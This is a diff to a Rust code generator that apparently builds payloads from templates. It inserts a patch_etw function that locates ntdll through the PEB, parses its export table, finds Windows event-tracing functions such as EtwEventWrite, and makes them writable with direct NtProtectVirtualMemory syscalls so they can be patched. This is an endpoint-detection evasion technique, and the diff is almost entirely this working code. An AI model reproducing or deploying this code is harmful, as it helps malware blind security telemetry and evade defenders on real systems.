@@ -126,9 +126,10 @@ fn add_etw_patch_replacements(replacements: &mut HashMap<&'static str, String>, 
     }
 
     let etw_patch_function = r#"
+#[allow(non_camel_case_types)]
 unsafe fn patch_etw() {
     use ntapi::ntpsapi::NtCurrentProcess;
-    use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};
+    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
     use winapi::ctypes::c_void;
     use winapi::shared::ntdef::NT_SUCCESS;
     use rust_syscalls::syscall;
@@ -163,13 +164,15 @@ unsafe fn patch_etw() {
     unsafe {
         #[cfg(target_arch = "x86_64")]
         {
-            let teb = std::arch::x86_64::_read_gs_base() as *mut u8;
-            peb_ptr = *(teb.add(0x60) as *mut *mut PEB);
+            let peb_addr: usize;
+            std::arch::asm!("mov {0}, gs:[0x60]", out(reg) peb_addr);
+            peb_ptr = peb_addr as *mut PEB;
         }
         #[cfg(target_arch = "x86")]
         {
-            let teb = std::arch::x86::_read_fs_base() as *mut u8;
-            peb_ptr = *(teb.add(0x30) as *mut *mut PEB);
+            let peb_addr: usize;
+            std::arch::asm!("mov {0}, fs:[0x30]", out(reg) peb_addr);
+            peb_ptr = peb_addr as *mut PEB;
         }
     }
 
@@ -206,23 +209,23 @@ unsafe fn patch_etw() {
     type IMAGE_EXPORT_DIRECTORY = [u8; 40];
 
     let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
-    let nt_headers_offset = unsafe { u32::from_le_bytes((*dos_header)[60..64].try_into().unwrap()) };
+    let nt_headers_offset = unsafe { u32::from_le_bytes((&(*dos_header))[60..64].try_into().unwrap()) };
     let nt_headers = ntdll_base.add(nt_headers_offset as usize) as *const IMAGE_NT_HEADERS64;
 
     let export_dir_rva = unsafe {
-        let data_dir_offset = (*nt_headers)[112..120].as_ptr() as *const IMAGE_DATA_DIRECTORY;
-        u32::from_le_bytes((*data_dir_offset)[0..4].try_into().unwrap())
+        let data_dir_offset = (&(*nt_headers))[112..120].as_ptr() as *const IMAGE_DATA_DIRECTORY;
+        u32::from_le_bytes((&(*data_dir_offset))[0..4].try_into().unwrap())
     };
 
     let export_dir = ntdll_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
 
-    let number_of_names = unsafe { u32::from_le_bytes((*export_dir)[20..24].try_into().unwrap()) };
-    let address_of_names = unsafe { u32::from_le_bytes((*export_dir)[32..36].try_into().unwrap()) };
-    let address_of_name_ordinals = unsafe { u32::from_le_bytes((*export_dir)[36..40].try_into().unwrap()) };
-    let address_of_functions = unsafe { u32::from_le_bytes((*export_dir)[16..20].try_into().unwrap()) };
+    let number_of_names = unsafe { u32::from_le_bytes((&(*export_dir))[20..24].try_into().unwrap()) };
+    let address_of_names = unsafe { u32::from_le_bytes((&(*export_dir))[32..36].try_into().unwrap()) };
+    let address_of_name_ordinals = unsafe { u32::from_le_bytes((&(*export_dir))[36..40].try_into().unwrap()) };
+    let address_of_functions = unsafe { u32::from_le_bytes((&(*export_dir))[16..20].try_into().unwrap()) };
 
     let mut etw_functions = Vec::new();
-    let target_names = [
+    let target_names: [&[u8]; 5] = [
         b"EtwEventWrite\0",
         b"EtwEventWriteFull\0",
         b"EtwEventRegister\0",
@@ -262,14 +265,14 @@ unsafe fn patch_etw() {
         }
     }
 
-    for func_addr in etw_functions {
+    for mut func_addr in etw_functions {
         let mut old_protect: u32 = 0;
         let mut size: usize = 16;
 
         let status = syscall!(
             "NtProtectVirtualMemory",
             NtCurrentProcess,
-            &mut func_addr as *mut *mut c_void,
+            &mut func_addr as *mut *mut u8 as *mut *mut c_void,
             &mut size,
             PAGE_EXECUTE_READWRITE,
             &mut old_protect
@@ -290,7 +293,7 @@ unsafe fn patch_etw() {
         let _ = syscall!(
             "NtProtectVirtualMemory",
             NtCurrentProcess,
-            &mut func_addr as *mut *mut c_void,
+            &mut func_addr as *mut *mut u8 as *mut *mut c_void,
             &mut size,
             old_protect,
             &mut 0
@@ -300,7 +303,7 @@ unsafe fn patch_etw() {
 "#.to_string();
 
     replacements.insert("{{ETW_PATCH_FUNCTION}}", etw_patch_function);
-    replacements.insert("{{ETW_PATCH_CALL}}", "patch_etw();".to_string());
+    replacements.insert("{{ETW_PATCH_CALL}}", "unsafe { patch_etw(); }".to_string());
 }
 
 /// Build the full replacement map for a given order.
